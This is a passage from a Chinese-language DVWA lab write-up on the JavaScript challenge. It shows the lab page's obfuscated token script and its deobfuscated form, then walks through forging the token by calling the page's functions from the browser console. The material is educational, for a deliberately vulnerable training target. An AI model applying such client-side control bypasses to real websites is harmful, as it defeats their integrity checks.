e;};eval(function(d,e,f,g,h,i){h=function(j){return(j<e?'':h(parseInt(j/e)))+((j=j%e)>0x23?String[b('0x0')](j+0x1d):j[b('0x1')](0x24));};if(!''[b('0x2')](/^/,String)){while(f--){i[h(f)]=g[f]||h(f);}g=[function(k){if('wpA'!==b('0x3')){return i[k];}else{while(f--){i[k(f)]=g[f]||k(f);}g=[function(l){return i[l];}];k=function(){return b('0x4');};f=0x1;}}];h=function(){return b('0x4');};f=0x1;};while(f--){if(g[f]){if(b('0x5')===b('0x6')){return i[h];}else{d=d[b('0x2')](new RegExp('\x5cb'+h(f)+'\x5cb','g'),g[f]);}}}return d;}(b('0x7'),0x3e,0x137,b('0x8')[b('0x9')]('|'),0x0,{}));
```

<p align="center">
    <img src="../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa75.png">
</p>

http://deobfuscatejavascript.com 中提供的功能是,把混淆后的代码转成人类能看懂一些 js 代码,其中关键的部分是这里:
```js
function do_something(e) {
    for (var t = "", n = e.length - 1; n >= 0; n--) t += e[n];
    return t
}
function token_part_3(t, y = "ZZ") {
    document.getElementById("token").value = sha256(document.getElementById("token").value + y)
}
function token_part_2(e = "YY") {
    document.getElementById("token").value = sha256(e + document.getElementById("token").value)
}
function token_part_1(a, b) {
    document.getElementById("token").value = do_something(document.getElementById("phrase").value)
}
document.getElementById("phrase").value = "";
setTimeout(function() {
    token_part_2("XX")
}, 300);
document.getElementById("send").addEventListener("click", token_part_3);
token_part_1("ABCD", 44);
```

这里生成 token 的步骤是
1. 执行 token_part_1("ABCD", 44)
2. 执行 token_part_2("XX")(原本是延迟 300ms 执行的那个)
3. 点击按钮的时候执行 token_part_3

所以我们在输入框输入 success 后,再到控制台中输入 `token_part_1("ABCD", 44)` 和 `token_part_2("XX")` 这两个函数就可以了.

注: 这里同上需要自己改下源代码,把路径中的 dvwa 加进去

### Impossible

**服务器端核心代码**
```php
You can never trust anything that comes from the user or prevent them from messing with it and so there is no impossible level.
```
你永远不要相信来自用户的任何东西或阻止他们搞乱它,所以没有不可能的等级.

---

**总结**

工具一下,exp 一连,shell 就有了,这谁都能学会,但在自己挖洞的过程中,基础的东西就很重要了,我觉得 dvwa 靶机的真正价值是带新人入门,将 web 各个方面都接触一些,这样有了开始,有了一个接触,之后就有方向了.
